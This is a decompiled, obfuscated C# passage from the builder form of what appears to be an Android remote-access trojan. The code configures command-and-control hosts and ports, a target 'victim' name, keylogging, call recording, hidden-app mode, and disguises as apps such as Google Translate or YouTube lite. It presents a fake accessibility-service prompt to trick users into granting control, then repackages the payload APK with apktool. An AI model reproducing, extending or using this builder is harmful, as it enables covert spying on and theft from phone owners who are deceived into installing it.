										MyProject.Computer.FileSystem.RenameFile(text, this.web0 + ".xml");
										break;
									}
									Thread.Sleep(this.int_1);
								}
								catch (Exception ex13)
								{
									Thread.Sleep(this.int_1);
								}
							}
							for (;;)
							{
								try
								{
									if (File.Exists(text2))
									{
										MyProject.Computer.FileSystem.RenameFile(text2, this.noti8 + ".xml");
										break;
									}
									Thread.Sleep(this.int_1);
								}
								catch (Exception ex14)
								{
									Thread.Sleep(this.int_1);
								}
							}
							this.int_3 = 80;
							try
							{
							}
							catch (Exception ex15)
							{
							}
							NewLateBinding.LateCall(NewLateBinding.LateGet(this.process_0, null, "StandardInput", new object[0], null, null, null), null, "WriteLine", new object[]
							{
								"apktool b temp"
							}, null, null, null, true);
							break;
							IL_40AE:
							goto IL_3F38;
						}
						catch (Exception ex16)
						{
							Thread.Sleep(this.int_1);
							continue;
						}
					}
					Thread.Sleep(this.int_1);
				}
			}
		}

		// Token: 0x060009CF RID: 2511 RVA: 0x0006D698 File Offset: 0x0006B898
		public void method_28(string string_0, string string_1)
		{
			if (this.staticLocalInitFlag_0 == null)
			{
				Interlocked.CompareExchange<StaticLocalInitFlag>(ref this.staticLocalInitFlag_0, new StaticLocalInitFlag(), null);
			}
			bool flag = false;
			try
			{
				Monitor.Enter(this.staticLocalInitFlag_0, ref flag);
				if (this.staticLocalInitFlag_0.State == 0)
				{
					this.staticLocalInitFlag_0.State = 2;
					this.random_3 = new Random();
				}
				else if (this.staticLocalInitFlag_0.State == 2)
				{
					throw new IncompleteInitialization();
				}
			}
			finally
			{
				this.staticLocalInitFlag_0.State = 1;
				if (flag)
				{
					Monitor.Exit(this.staticLocalInitFlag_0);
				}
			}
			FileInfo[] files = new DirectoryInfo(string_0).GetFiles();
			FileInfo fileInfo = files[this.random_3.Next(0, checked(files.Count<FileInfo>() - 1))];
			File.Move(fileInfo.FullName, fileInfo.FullName.Replace(string_0, string_1));
		}

		// Token: 0x060009D0 RID: 2512 RVA: 0x0006D774 File Offset: 0x0006B974
		public void method_29(string string_0, string string_1)
		{
			if (this.staticLocalInitFlag_1 == null)
			{
				Interlocked.CompareExchange<StaticLocalInitFlag>(ref this.staticLocalInitFlag_1, new StaticLocalInitFlag(), null);
			}
			bool flag = false;
			try
			{
				Monitor.Enter(this.staticLocalInitFlag_1, ref flag);
				if (this.staticLocalInitFlag_1.State == 0)
				{
					this.staticLocalInitFlag_1.State = 2;
					this.random_4 = new Random();
				}
				else if (this.staticLocalInitFlag_1.State == 2)
				{
					throw new IncompleteInitialization();
				}
			}
			finally
			{
				this.staticLocalInitFlag_1.State = 1;
				if (flag)
				{
					Monitor.Exit(this.staticLocalInitFlag_1);
				}
			}
			DirectoryInfo[] directories = new DirectoryInfo(string_0).GetDirectories();
			DirectoryInfo directoryInfo = directories[this.random_4.Next(0, checked(directories.Count<DirectoryInfo>() - 1))];
			Directory.Move(directoryInfo.FullName, directoryInfo.FullName.Replace(string_0, string_1));
		}

		// Token: 0x060009D1 RID: 2513 RVA: 0x0006D850 File Offset: 0x0006BA50
		private void method_30(string string_0)
		{
			if (base.InvokeRequired)
			{
				string[] args = new string[]
				{
					string_0
				};
				base.Invoke(new Action<string>(this.method_30), args);
			}
			else
			{
				this.TextBox1.AppendText("\r\n-> " + string_0);
				if (string_0.ToLower().Contains("xmls"))
				{
					this.method_30(Module2.smethod_58("nYkQNJPsSYRChf6nAyztCib9/A+YvzAr7PVsz8HbNSY=", "files") + this.method_81() + Module2.smethod_58("qKF6n5Ea5mtA2n5Fr3RnPQ==", "bytes"));
				}
			}
		}

		// Token: 0x060009D2 RID: 2514 RVA: 0x0006D8E0 File Offset: 0x0006BAE0
		private void method_31(string string_0)
		{
			if (!base.InvokeRequired)
			{
				this.errorlogs.AppendText("\r\n-> " + string_0);
			}
			else
			{
				string[] args = new string[]
				{
					string_0
				};
				base.Invoke(new Action<string>(this.method_31), args);
			}
		}

		// Token: 0x060009D3 RID: 2515 RVA: 0x0006D92C File Offset: 0x0006BB2C
		private void method_32(string string_0)
		{
			if (!base.InvokeRequired)
			{
				this.TextBox1.AppendText(string_0);
			}
			else
			{
				string[] args = new string[]
				{
					string_0
				};
				base.Invoke(new Action<string>(this.method_32), args);
			}
		}

		// Token: 0x060009D4 RID: 2516 RVA: 0x0006D970 File Offset: 0x0006BB70
		private void method_33()
		{
			try
			{
				Application.ExitThread();
				NewLateBinding.LateCall(this.process_0, null, "CancelOutputRead", new object[0], null, null, null, true);
				NewLateBinding.LateCall(this.process_0, null, "CancelErrorRead", new object[0], null, null, null, true);
				NewLateBinding.LateCall(this.process_0, null, "Kill", new object[0], null, null, null, true);
				NewLateBinding.LateCall(this.process_0, null, "Close", new object[0], null, null, null, true);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060009D5 RID: 2517 RVA: 0x0006DA14 File Offset: 0x0006BC14
		private void method_34()
		{
			try
			{
				this.method_33();
			}
			catch (Exception ex)
			{
			}
			finally
			{
			}
		}

		// Token: 0x170002D2 RID: 722
		// (get) Token: 0x060009D6 RID: 2518 RVA: 0x00005F9D File Offset: 0x0000419D
		public object Object_0 { get; }

		// Token: 0x060009D7 RID: 2519 RVA: 0x0006DA58 File Offset: 0x0006BC58
		[CompilerGenerated]
		public void method_35(object _object_0)
		{
			this._Object_0 = RuntimeHelpers.GetObjectValue(_object_0);
		}

		// Token: 0x060009D8 RID: 2520 RVA: 0x0006DA74 File Offset: 0x0006BC74
		public string method_36()
		{
			string result;
			try
			{
				string[] separator = new string[]
				{
					"\\"
				};
				string[] array = Application.StartupPath.Split(separator, StringSplitOptions.RemoveEmptyEntries);
				result = array[0].ToString() + "\\";
			}
			catch (Exception ex)
			{
				result = "C:\\";
			}
			return result;
		}

		// Token: 0x060009D9 RID: 2521 RVA: 0x0006DADC File Offset: 0x0006BCDC
		private void method_37(bool bool_12)
		{
			try
			{
				Process.GetProcessesByName("java")[0].Kill();
			}
			catch (Exception ex)
			{
			}
			try
			{
				Process.GetProcessesByName("cmd")[0].Kill();
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x060009DA RID: 2522 RVA: 0x0006DB4C File Offset: 0x0006BD4C
		public string method_38()
		{
			return this.method_40().ToString();
		}

		// Token: 0x060009DB RID: 2523 RVA: 0x0006DB68 File Offset: 0x0006BD68
		private void method_39()
		{
			MySettingsProperty.Settings.build_text_name_victim = this.TextNameVictim.Text;
			MySettingsProperty.Settings.build_text_name_patch = this.TextNamePatch.Text;
			MySettingsProperty.Settings.build_text_version = this.TextVersion.Text;
			MySettingsProperty.Settings.build_text_sleep = Conversions.ToInteger("0");
			MySettingsProperty.Settings.build_text_port = Convert.ToInt32(this.po.Value);
			MySettingsProperty.Settings.build_Checked_hide = this.CheckHide.Checked;
			MySettingsProperty.Settings.build_Checked_doze = this.CheckDoze.Checked;
			MySettingsProperty.Settings.build_Checked_icon = this.CheckIconPatch.Checked;
			MySettingsProperty.Settings.build_path_icon = this.string_8;
			MySettingsProperty.Settings.BIND_Path = this.string_1;
			MySettingsProperty.Settings.BIND_EX = this.string_2;
			MySettingsProperty.Settings.intent = this.string_7;
			string text = "";
			checked
			{
				if (this.DGV0.Rows.Count <= 0)
				{
					text = "null";
				}
				else
				{
					int num = this.DGV0.Rows.Count - 1;
					for (int i = 0; i <= num; i++)
					{
						text = Conversions.ToString(Operators.ConcatenateObject(text, Operators.ConcatenateObject(this.DGV0.Rows[i].Cells[0].Value, this.string_22)));
					}
				}
				MySettingsProperty.Settings.build_DGV_list = text;
				MySettingsProperty.Settings.Save();
			}
		}

		// Token: 0x060009DC RID: 2524 RVA: 0x0006DCF0 File Offset: 0x0006BEF0
		internal string method_40()
		{
			ManagementObject managementObject = new ManagementObject(string.Format("win32_logicaldisk.deviceid=\"{0}:\"", "C"));
			managementObject.Get();
			return managementObject[Module2.smethod_58("8tqSUqXFSzzZ4A7ikUbVogUwXcIXSn1opihYRqEbX0o=", "Timer1")].ToString();
		}

		// Token: 0x060009DD RID: 2525 RVA: 0x0006DD34 File Offset: 0x0006BF34
		private void Build_Closing(object sender, CancelEventArgs e)
		{
			if (this.TiMAT.Enabled > false)
			{
				this.TiMAT.Enabled = false;
			}
			base.DialogResult = DialogResult.Cancel;
		}

		// Token: 0x060009DE RID: 2526 RVA: 0x0006DD64 File Offset: 0x0006BF64
		private void TextPackage_TextChanged(object sender, EventArgs e)
		{
			string text = this.TextPackage.Text.Trim();
			if (this.bool_1 && !text.Contains("."))
			{
				int selectionStart = this.TextPackage.SelectionStart;
				text = text.Insert(selectionStart, ".");
				this.TextPackage.Text = text;
				try
				{
					this.TextPackage.SelectionStart = text.IndexOf(".");
				}
				catch (Exception ex)
				{
				}
			}
			checked
			{
				try
				{
					if (Versioned.IsNumeric(text[0].ToString()))
					{
						this.TextPackage.Text = text.Substring(1, text.Length - 1);
					}
				}
				catch (Exception ex2)
				{
				}
				try
				{
					if (Versioned.IsNumeric(text[text.IndexOf(".") + 1].ToString()))
					{
						this.TextPackage.Text = this.TextPackage.Text.Replace("." + text[text.IndexOf(".") + 1].ToString(), ".");
						this.TextPackage.SelectionStart = text.IndexOf(".");
					}
				}
				catch (Exception ex3)
				{
				}
			}
		}

		// Token: 0x060009DF RID: 2527 RVA: 0x0006DEDC File Offset: 0x0006C0DC
		private void TextPackage_KeyDown(object sender, KeyEventArgs e)
		{
			if (e.KeyCode != Keys.Back)
			{
				this.bool_1 = false;
			}
			else
			{
				this.bool_1 = true;
			}
		}

		// Token: 0x060009E0 RID: 2528 RVA: 0x0006DF04 File Offset: 0x0006C104
		private void TextPackage_KeyPress(object sender, KeyPressEventArgs e)
		{
			if (this.TextPackage.SelectionLength != 0 && this.TextPackage.SelectedText.Contains("."))
			{
				this.TextPackage.DeselectAll();
				e.Handled = true;
			}
			else
			{
				string text = this.TextPackage.Text.Trim();
				string text2 = "qazwsxedcrfvtgbyhnujmikolp";
				string text3 = "1234567890qazwsxedcrfvtgbyhnujmikolp";
				if (!text.EndsWith("."))
				{
					if (!text3.Contains(e.KeyChar.ToString().ToLower()) && !this.bool_1)
					{
						e.Handled = true;
					}
				}
				else if (!text2.Contains(e.KeyChar.ToString().ToLower()) && !this.bool_1)
				{
					e.Handled = true;
				}
			}
		}

		// Token: 0x060009E1 RID: 2529 RVA: 0x0006DFD8 File Offset: 0x0006C1D8
		private void method_45(object sender, KeyPressEventArgs e)
		{
			string text = "1234567890qazwsxedcrfvtgbyhnujmikolp";
			if (!text.Contains(e.KeyChar.ToString().ToLower()) && !this.bool_0)
			{
				e.Handled = true;
			}
		}

		// Token: 0x060009E2 RID: 2530 RVA: 0x0000246D File Offset: 0x0000066D
		private void TextVersion_KeyPress(object sender, KeyPressEventArgs e)
		{
		}

		// Token: 0x060009E3 RID: 2531 RVA: 0x0000246D File Offset: 0x0000066D
		private void TextVersion_KeyDown(object sender, KeyEventArgs e)
		{
		}

		// Token: 0x060009E4 RID: 2532 RVA: 0x0006E018 File Offset: 0x0006C218
		private void method_48(object sender, KeyEventArgs e)
		{
			if (e.KeyCode == Keys.Back)
			{
				this.bool_0 = true;
			}
			else
			{
				this.bool_0 = false;
			}
		}

		// Token: 0x060009E5 RID: 2533 RVA: 0x0006E040 File Offset: 0x0006C240
		private void method_49(object sender, EventArgs e)
		{
			TimeSpan timeSpan = TimeSpan.FromMilliseconds(0.0);
			string str = string.Empty;
			if (timeSpan.Days != 0)
			{
				str = str + "Days " + Conversions.ToString(timeSpan.Days) + "\r\n";
			}
			if (timeSpan.Hours != 0)
			{
				str = str + "Hours:" + Conversions.ToString(timeSpan.Hours) + "\r\n";
			}
			if (timeSpan.Minutes != 0)
			{
				str = str + "Minutes:" + Conversions.ToString(timeSpan.Minutes) + "\r\n";
			}
			if (timeSpan.Seconds != 0)
			{
				str = str + "Seconds:" + Conversions.ToString(timeSpan.Seconds) + "\r\n";
			}
			if (timeSpan.Milliseconds != 0)
			{
				str = str + "Millis " + Conversions.ToString(timeSpan.Milliseconds) + "\r\n";
			}
		}

		// Token: 0x060009E6 RID: 2534 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_50(object sender, EventArgs e)
		{
		}

		// Token: 0x060009E7 RID: 2535 RVA: 0x0006E130 File Offset: 0x0006C330
		private void method_51(object sender, EventArgs e)
		{
			this.method_53(false);
		}

		// Token: 0x060009E8 RID: 2536 RVA: 0x0006E144 File Offset: 0x0006C344
		private void method_52(object sender, EventArgs e)
		{
			this.method_53(true);
		}

		// Token: 0x060009E9 RID: 2537 RVA: 0x0006E158 File Offset: 0x0006C358
		private void method_53(bool bool_12)
		{
			checked
			{
				if (this.DGV0.SelectedRows.Count == 1 & this.DGV0.Rows.Count != 1)
				{
					int num = this.DGV0.SelectedRows.Count - 1;
					for (int i = num; i >= 0; i += -1)
					{
						string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Value);
						if (!bool_12)
						{
							if (this.DGV0.SelectedRows[i].Index != 0)
							{
								this.DGV0.Rows.Insert(this.DGV0.SelectedRows[i].Index - 1, new object[]
								{
									text
								});
								this.DGV0.CurrentCell = this.DGV0.Rows[this.DGV0.SelectedRows[i].Index - 1].Cells[0];
								this.DGV0.Rows.RemoveAt(this.DGV0.SelectedRows[i].Index + 1);
								this.DGV0.CurrentCell = this.DGV0.Rows[this.DGV0.SelectedRows[i].Index - 1].Cells[0];
							}
						}
						else
						{
							this.DGV0.Rows.RemoveAt(this.DGV0.SelectedRows[i].Index);
							this.DGV0.Rows.Insert(this.DGV0.SelectedRows[i].Index + 1, new object[]
							{
								text
							});
							this.DGV0.CurrentCell = this.DGV0.Rows[this.DGV0.SelectedRows[i].Index + 1].Cells[0];
						}
					}
				}
			}
		}

		// Token: 0x060009EA RID: 2538 RVA: 0x0006E38C File Offset: 0x0006C58C
		private void Build_FormClosing(object sender, FormClosingEventArgs e)
		{
			try
			{
				MySettingsProperty.Settings.NotifiTitle = this.Nottitle.Text;
				MySettingsProperty.Settings.NotifiText = this.Notmsg.Text;
				MySettingsProperty.Settings.bodytext = this.logbodytext.Text;
				MySettingsProperty.Settings.accessdiscribe = this.dscriptext.Text;
				MySettingsProperty.Settings.Save();
				if (File.Exists(this.string_44 + "\\temp.apk"))
				{
					File.Delete(this.string_44 + "\\temp.apk");
				}
			}
			catch (Exception ex)
			{
			}
			this.method_37(false);
		}

		// Token: 0x060009EB RID: 2539 RVA: 0x0006E44C File Offset: 0x0006C64C
		private void Panel1_Paint(object sender, PaintEventArgs e)
		{
			e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
			Color white = Module5.White;
			if (this.rectangles_0.Count > 0)
			{
				try
				{
					foreach (Rectangle rect in this.rectangles_0)
					{
						if (rect.Width > 0)
						{
							e.Graphics.FillRectangle(new SolidBrush(white), rect);
						}
					}
				}
				finally
				{
					List<Rectangle>.Enumerator enumerator;
					((IDisposable)enumerator).Dispose();
				}
			}
			Color color = Color.FromArgb(150, (int)Module5.White.R, (int)Module5.White.G, (int)Module5.White.B);
			Pen pen = new Pen(color, 1f);
			Rectangle rect2 = checked(new Rectangle(0, 0, this.Panel1.Width - 1, this.Panel1.Height - 1));
			e.Graphics.DrawRectangle(pen, rect2);
		}

		// Token: 0x060009EC RID: 2540 RVA: 0x0006E544 File Offset: 0x0006C744
		private void combotype_SelectedIndexChanged(object sender, EventArgs e)
		{
			if (Operators.CompareString(this.combotype.Text, "Custom", false) == 0)
			{
				this.fakepanel.Enabled = true;
			}
			else
			{
				this.fakepanel.Enabled = false;
			}
		}

		// Token: 0x060009ED RID: 2541 RVA: 0x0006E588 File Offset: 0x0006C788
		private void Button1_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.InitialDirectory = "C:\\";
			openFileDialog.Title = "Selecte Fake App icon [Only .png] (.png)";
			openFileDialog.Filter = "png Files|*.png";
			DialogResult dialogResult = openFileDialog.ShowDialog();
			if (dialogResult != DialogResult.OK)
			{
				this.fakeiconpic.Image = null;
				this.string_26 = "null";
				this.CheckIconPatch.Checked = false;
			}
			else
			{
				this.string_26 = openFileDialog.FileName;
				this.fakeiconpic.Image = Module2.smethod_38(Image.FromFile(openFileDialog.FileName), new Size(144, 144), false);
			}
		}

		// Token: 0x060009EE RID: 2542 RVA: 0x0006E624 File Offset: 0x0006C824
		private void randomidbtn_Click(object sender, EventArgs e)
		{
			this.TextPackage.Text = string.Concat(new string[]
			{
				this.strings_0[this.random_1.Next(0, this.strings_0.Length)],
				".",
				this.strings_0[this.random_1.Next(0, this.strings_0.Length)],
				".",
				this.strings_0[this.random_1.Next(0, this.strings_0.Length)]
			});
		}

		// Token: 0x060009EF RID: 2543 RVA: 0x0006E6B4 File Offset: 0x0006C8B4
		private void SelectedApk_Click(object sender, EventArgs e)
		{
			checked
			{
				if (Module2.smethod_30(Module2.smethod_60("sr0XkfgCUuEpBThzbMiRoQ==", "2016497584603195"), "You are the only responsible for using this program  Only install in phone you have permissions to", true))
				{
					if (this.DGV0.Rows.Count != 0)
					{
						if (this.TextNameVictim.Text.Length != 0)
						{
							if (this.TextNamePatch.Text.Length != 0)
							{
								if (this.TextVersion.Text.Length != 0)
								{
									if (this.TextPackage.Text.Length != 0)
									{
										if (this.TextPackage.Text.Length != 0)
										{
											if (!(this.TextPackage.Text.Trim().StartsWith(".") | this.TextPackage.Text.Trim().EndsWith(".")))
											{
												if (this.CheckBIND.Checked)
												{
													if (!this.trgtbkg.Text.Contains("."))
													{
														Alert.ShowInformation("Recheck Targer Binded App Package Name");
														return;
													}
													this.string_33 = this.trgtbkg.Text.ToLower();
												}
												else
												{
													this.string_33 = "null";
												}
												if (this.CheckRecord.Checked)
												{
													this.string_34 = "YES";
												}
												this.method_30(Module2.smethod_60("fitForrawk8bzeoJB7izeO5WOKFSZcKVkrad6V1hR7afjn+564sVsuojdlzzbj6h", "9184956251847593"));
												Thread.Sleep(5000);
												string text = this.combotype.Text;
												uint num = <PrivateImplementationDetails>_1.ComputeStringHash(text);
												if (num > 2502277006U)
												{
													if (num <= 3569286750U)
													{
														if (num != 3073407600U)
														{
															if (num == 3569286750U)
															{
																if (Operators.CompareString(text, "Hidden App", false) == 0)
																{
																	this.T = "K";
																	this.string_24 = "   ";
																	this.string_25 = "";
																	goto IL_490;
																}
															}
														}
														else if (Operators.CompareString(text, "Google Translate", false) == 0)
														{
															this.T = "C";
															this.string_26 = Module8.string_2 + "\\gtrans.png";
															this.string_24 = "Google Translate";
															this.string_25 = Module8.smethod_2("https://translate.google.com");
															goto IL_490;
														}
													}
													else if (num != 3833625312U)
													{
														if (num == 4125203886U)
														{
															if (Operators.CompareString(text, "Youtube lite", false) == 0)
															{
																this.T = "C";
																this.string_26 = Module8.string_2 + "\\ytlite.png";
																this.string_24 = "Youtube lite";
																this.string_25 = Module8.smethod_2("https://www.youtube.com");
																goto IL_490;
															}
														}
													}
													else if (Operators.CompareString(text, "Proxy App", false) == 0)
													{
														this.T = "C";
														this.string_26 = Module8.string_2 + "\\knox.png";
														this.string_24 = "Filterbypass";
														this.string_25 = Module8.smethod_2("https://www.filterbypass.me");
														goto IL_490;
													}
												}
												else if (num > 315666638U)
												{
													if (num != 1454961525U)
													{
														if (num == 2502277006U)
														{
															if (Operators.CompareString(text, "Custom", false) == 0)
															{
																this.T = "C";
																if (Operators.CompareString(this.string_26, "null", false) != 0)
																{
																	this.string_24 = this.Textfakename.Text;
																	this.string_25 = Module8.smethod_2(this.Textfakelink.Text);
																	goto IL_490;
																}
																Alert.ShowInformation("Select Custom App icon");
																return;
															}
														}
													}
													else if (Operators.CompareString(text, "App Store", false) == 0)
													{
														this.T = "C";
														this.string_26 = Module8.string_2 + "\\appstore.png";
														this.string_24 = "APK DONE";
														this.string_25 = Module8.smethod_2("https://apkdone.com/");
														goto IL_490;
													}
												}
												else if (num != 106496249U)
												{
													if (num == 315666638U)
													{
														if (Operators.CompareString(text, "Temp Mail", false) == 0)
														{
															this.T = "C";
															this.string_26 = Module8.string_2 + "\\tempmailicon.png";
															this.string_24 = "Temp Mail";
															this.string_25 = Module8.smethod_2("https://temp-mail.org");
															goto IL_490;
														}
													}
												}
												else if (Operators.CompareString(text, "Wallpapers App", false) == 0)
												{
													this.T = "C";
													this.string_26 = Module8.string_2 + "\\artcanvas.png";
													this.string_24 = "Papers";
													this.string_25 = Module8.smethod_2("https://papers.co");
													goto IL_490;
												}
												this.T = "T";
												IL_490:
												if (Operators.CompareString(this.combotype.Text, "Hidden App", false) != 0)
												{
													this.string_32 = "ONE";
												}
												else
												{
													this.string_32 = "TEN";
												}
												if (Operators.CompareString(this.checkver.Text, "V1", false) == 0)
												{
													this.string_29 = "22";
												}
												else
												{
													if (Operators.CompareString(this.checkver.Text, "V2", false) != 0)
													{
														this.method_30("No Ver Selected , Default : V2");
													}
													this.string_29 = "29";
												}
												string text2 = null;
												string text3 = null;
												string text4 = null;
												try
												{
													foreach (object obj in ((IEnumerable)this.DGV0.Rows))
													{
														object objectValue = RuntimeHelpers.GetObjectValue(obj);
														string text5 = ((DataGridViewRow)objectValue).Cells[0].Value.ToString();
														string[] array = text5.ToString().Trim().Split(new string[]
														{
															":"
														}, StringSplitOptions.None);
														text2 = text2 + array[0] + ":";
														text3 = text3 + array[1] + ":";
													}
												}
												finally
												{
													IEnumerator enumerator;
													if (enumerator is IDisposable)
													{
														(enumerator as IDisposable).Dispose();
													}
												}
												text2 = text2.Substring(0, text2.Length - 1);
												text3 = text3.Substring(0, text3.Length - 1);
												string text6 = this.TextNameVictim.Text;
												string text7 = this.TextNamePatch.Text;
												string text8 = this.TextVersion.Text;
												text4 += "1";
												if (!this.CheckDoze.Checked)
												{
													this.string_31 = " ";
													this.string_30 = " ";
													text4 += "0";
												}
												else
												{
													if (this.Nottitle.Text.Length < 1)
													{
														this.string_31 = " ";
													}
													else
													{
														this.string_31 = this.Nottitle.Text;
													}
													if (this.Notmsg.Text.Length >= 1)
													{
														this.string_30 = this.Notmsg.Text;
													}
													else
													{
														this.string_30 = " ";
													}
													text4 += "1";
												}
												if (!this.CheckBIND.Checked)
												{
													text4 += "0";
												}
												else
												{
													text4 += "1";
												}
												text4 += "0";
												text4 += "0";
												text4 += "0";
												text4 += "1";
												if (this.checkkeyloger.Checked)
												{
													this.string_27 = "on";
												}
												else
												{
													this.string_27 = Conversions.ToString(this.method_16(10, 15));
												}
												if (this.checkemo.Checked)
												{
													this.string_28 = "NOEMO";
												}
												else
												{
													this.string_28 = Conversions.ToString(this.method_16(10, 15));
												}
												if (this.CheckDoze.Checked)
												{
													this.string_6 = "on";
													text4 += "1";
												}
												else
												{
													text4 += "0";
												}
												if (this.Checksuper.Checked)
												{
													this.string_3 = "on";
												}
												if (this.CheckQuick.Checked)
												{
													this.string_4 = "on";
												}
												if (this.CheckDraw.Checked)
												{
													this.string_5 = "on";
												}
												string text9 = Conversions.ToString(0);
												string text10 = "";
												string[] array2 = this.TextPackage.Text.Split(new char[]
												{
													'.'
												});
												string text11 = array2[array2.Length - 1];
												Color color = Module5.color_0;
												Color white = Module5.White;
												string text12 = string.Format("{0},{1},{2}|{3},{4},{5}", new object[]
												{
													color.R,
													color.G,
													color.B,
													white.R,
													white.G,
													white.B
												});
												string text13 = string.Concat(new string[]
												{
													text2,
													this.string_0,
													text3,
													this.string_0,
													text6,
													this.string_0,
													text7,
													this.string_0,
													text8,
													this.string_0,
													text4,
													":",
													GClass9.string_4,
													this.string_0,
													text9,
													this.string_0,
													text10,
													this.string_0,
													Module8.string_1,
													"\\Lib\\platformBinary.zip",
													this.string_0,
													"null",
													this.string_0,
													Module8.string_1,
													"\\Fonts\\",
													this.string_0,
													text11,
													this.string_0,
													text12,
													this.string_0,
													this.string_8,
													this.string_0,
													MySettingsProperty.Settings.FontStyle,
													this.string_0,
													Conversions.ToString(MySettingsProperty.Settings.FontSize),
													this.string_0,
													this.string_1,
													this.string_0,
													this.string_2,
													this.string_0,
													this.string_7,
													this.string_0,
													this.TextPackage.Text
												});
												this.method_21(text13);
												this.method_39();
											}
											else
											{
												Alert.ShowInformation("Package segments must be of non-zero length");
											}
										}
										else
										{
											Alert.ShowInformation("Package Name empty");
										}
									}
									else
									{
										Alert.ShowInformation("Package Name empty");
									}
								}
								else
								{
									Alert.ShowInformation("version empty");
								}
							}
							else
							{
								Alert.ShowInformation("name patch empty");
							}
						}
						else
						{
							Alert.ShowInformation("name of victim empty");
						}
					}
					else
					{
						Alert.ShowInformation("Addd (Host or ip) + Port First");
					}
				}
			}
		}

		// Token: 0x060009F0 RID: 2544 RVA: 0x0006F18C File Offset: 0x0006D38C
		private void DrakeUIAvatar1_Click(object sender, EventArgs e)
		{
			this.DGV0.Rows.Add(new object[]
			{
				this.TextIP.Text + ":" + Conversions.ToString(this.po.Value)
			});
		}

		// Token: 0x060009F1 RID: 2545 RVA: 0x0006F1D8 File Offset: 0x0006D3D8
		private void DrakeUIAvatar2_Click(object sender, EventArgs e)
		{
			checked
			{
				if (this.DGV0.SelectedRows.Count > 0)
				{
					int num = this.DGV0.SelectedRows.Count - 1;
					for (int i = num; i >= 0; i += -1)
					{
						this.DGV0.Rows.RemoveAt(this.DGV0.SelectedRows[i].Index);
					}
				}
			}
		}

		// Token: 0x060009F2 RID: 2546 RVA: 0x0000246D File Offset: 0x0000066D
		private void Label6_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060009F3 RID: 2547 RVA: 0x0006F240 File Offset: 0x0006D440
		private void TextSize_TextChanged(object sender, EventArgs e)
		{
			if (!Versioned.IsNumeric(this.TextSize.Text))
			{
				Alert.ShowInformation("Only Enter Numbers");
				this.TextSize.Text = "30";
			}
		}

		// Token: 0x060009F4 RID: 2548 RVA: 0x0006F27C File Offset: 0x0006D47C
		private void Button3_Click(object sender, EventArgs e)
		{
			this.logtitletext.Text = "Accessibility Service";
			this.logbodytext.Text = "This App Request Accessibility Service:\r\n• Click on Enable\r\n• Go to Downloaded Service\r\n• Enable [MY-NAME]";
			this.logbtntext.Text = "Enable";
		}

		// Token: 0x060009F5 RID: 2549 RVA: 0x0006F2BC File Offset: 0x0006D4BC
		private void Panel3_Paint(object sender, PaintEventArgs e)
		{
			e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
			Color white = Module5.White;
			if (this.rectangles_1.Count > 0)
			{
				try
				{
					foreach (Rectangle rect in this.rectangles_1)
					{
						if (rect.Width > 0)
						{
							e.Graphics.FillRectangle(new SolidBrush(white), rect);
						}
					}
				}
				finally
				{
					List<Rectangle>.Enumerator enumerator;
					((IDisposable)enumerator).Dispose();
				}
			}
			Color color = Color.FromArgb(150, (int)Module5.White.R, (int)Module5.White.G, (int)Module5.White.B);
			Pen pen = new Pen(color, 1f);
			Rectangle rect2 = checked(new Rectangle(0, 0, this.Panel3.Width - 1, this.Panel3.Height - 1));
			e.Graphics.DrawRectangle(pen, rect2);
		}

		// Token: 0x060009F6 RID: 2550 RVA: 0x0006F3B8 File Offset: 0x0006D5B8
		private void CheckAllPrims_MouseClick(object sender, EventArgs e)
		{
			if (this.CheckAllPrims.Checked)
			{
				try
				{
					foreach (object obj in this.comboproms.Items)
					{
						object objectValue = RuntimeHelpers.GetObjectValue(obj);
						this.Primslist.Items.Add(RuntimeHelpers.GetObjectValue(objectValue));
					}
					return;
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			this.Primslist.Items.Clear();
		}

		// Token: 0x060009F7 RID: 2551 RVA: 0x0006F448 File Offset: 0x0006D648
		private void addactiv_Click(object sender, EventArgs e)
		{
			if (!(string.IsNullOrEmpty(this.comboproms.Text) | string.IsNullOrWhiteSpace(this.comboproms.Text)))
			{
				if (!this.Primslist.Items.Contains(this.comboproms.Text))
				{
					this.Primslist.Items.Add(this.comboproms.Text);
				}
				else
				{
					Alert.ShowInformation("Permission All Ready Add");
				}
			}
			else
			{
				Alert.ShowInformation("Select Permission to Add");
			}
		}

		// Token: 0x060009F8 RID: 2552 RVA: 0x0006F4CC File Offset: 0x0006D6CC
		private void removeactiv_Click(object sender, EventArgs e)
		{
			if (this.Primslist.Items.Count == 0)
			{
			}
			if (this.Primslist.Items.Count <= 0)
			{
				Alert.ShowInformation("No Permission to Remove");
			}
			else if (this.Primslist.SelectedItem == null)
			{
				Alert.ShowInformation("Select Permission First");
			}
			else
			{
				this.Primslist.Items.Remove(RuntimeHelpers.GetObjectValue(this.Primslist.SelectedItem));
			}
		}

		// Token: 0x060009F9 RID: 2553 RVA: 0x0006F54C File Offset: 0x0006D74C
		private void Label33_MouseEnter(object sender, EventArgs e)
		{
			this.explaintoolstext.Text = "• only Request File Manager Permission And you can request Permissions Later\r\n• Dont Forget to Add permission on Permissions Page.";
		}

		// Token: 0x060009FA RID: 2554 RVA: 0x0006F56C File Offset: 0x0006D76C
		private void Label33_MouseLeave(object sender, EventArgs e)
		{
			this.explaintoolstext.Text = "";
		}

		// Token: 0x060009FB RID: 2555 RVA: 0x0006F58C File Offset: 0x0006D78C
		private void Label35_MouseEnter(object sender, EventArgs e)
		{
			this.explaintoolstext.Text = "• Request Drawing Over Apps When app started\r\n• This permission required to ask later for permissions\r\n";
		}

		// Token: 0x060009FC RID: 2556 RVA: 0x0006F56C File Offset: 0x0006D76C
		private void Label35_MouseLeave(object sender, EventArgs e)
		{
			this.explaintoolstext.Text = "";
		}

		// Token: 0x060009FD RID: 2557 RVA: 0x0006F5AC File Offset: 0x0006D7AC
		private void CheckQuick_MouseClick(object sender, EventArgs e)
		{
			if (this.CheckQuick.Checked)
			{
				this.CheckRecord.Checked = true;
				this.CheckRecord.Refresh();
				this.checkkeyloger.Checked = true;
				this.checkkeyloger.Refresh();
